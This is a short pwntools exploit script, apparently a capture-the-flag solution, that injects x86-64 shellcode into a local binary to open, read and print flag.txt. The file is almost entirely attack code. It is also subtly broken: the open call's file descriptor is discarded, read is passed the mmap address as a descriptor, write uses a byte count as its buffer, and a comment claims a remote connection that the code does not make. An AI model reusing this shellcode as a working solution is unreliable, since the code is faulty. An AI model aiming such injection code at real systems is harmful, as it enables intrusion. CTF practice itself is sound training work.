from pwn import *

# Set the architecture to amd64 (64-bit)
context.arch = 'amd64'

# Connect to the remote server
conn = process('./open_what_write')

# Shellcode to open, read, and write the flag
shellcode = asm('''
    mov rax, 2
    lea rdi, [rip + flag]
    xor rsi, rsi
    xor rdx, rdx
    syscall

    cmp rax, 0
    jl exit

    mov rdi, 0
    mov rsi, 4096
    mov rdx, 0x7
    mov r10, 0x22
    mov r8, -1
    mov r9, 0
    mov rax, 9
    syscall

    mov rdi, rax
    mov rsi, rax
    mov rdx, 4096
    xor rax, rax
    syscall

    mov rdi, 1
    mov rsi, rax
    mov rdx, 4096
    mov rax, 1
    syscall

exit:
    mov rax, 60
    xor rdi, rdi
    syscall

flag:
    .string "flag.txt"
''')

# Send the shellcode
conn.sendlineafter("Enter your shellcode: ", shellcode)

# Receive the flag
conn.interactive()